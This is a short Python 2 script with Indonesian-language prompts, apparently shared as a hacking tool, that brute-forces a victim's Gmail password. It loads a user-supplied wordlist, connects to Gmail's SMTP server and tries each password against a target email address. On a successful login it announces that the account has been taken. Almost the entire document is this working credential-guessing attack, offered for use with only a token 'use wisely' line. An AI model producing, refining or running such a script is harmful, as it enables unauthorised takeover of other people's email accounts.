#!/usr/bin/python
'''create by Ha3MrX'''

import smtplib
from os import system

def main():

   print '  Create    : Xcvsyh10'
   print '  Version   : v1.0.0'
   print '  Instagram : xcvsyh10'
   print '  Github    : xcvsyh10'
   print '  TOLONG GUNAKAN DENGAN BIJAK BY: Xcvsyh10'
   print '  Follow Instagram Saya Untuk Update : Xcvsyh10'

main()
print '[1] Mulai Hack?'
print '[2] Keluar'
option = input('==>')
if option == 1:
   file_path = raw_input('Tulis word.txt:')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] SELAMAT AKUN TELAH BERHASIL DI AMBIL :' + password + '     ^_^'
         print '  Terima Kasih Telah Menggunakan Script Saya'  
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] SELAMAT AKUN TELAH BERHASIL DI AMBIL :' + password + '     ^_^'
            print '  Terima Kasih Telah Menggunakan Script Saya'

            break
         else:
            print '[!] MAAF PASSWORD SALAH => ' + password
login()
    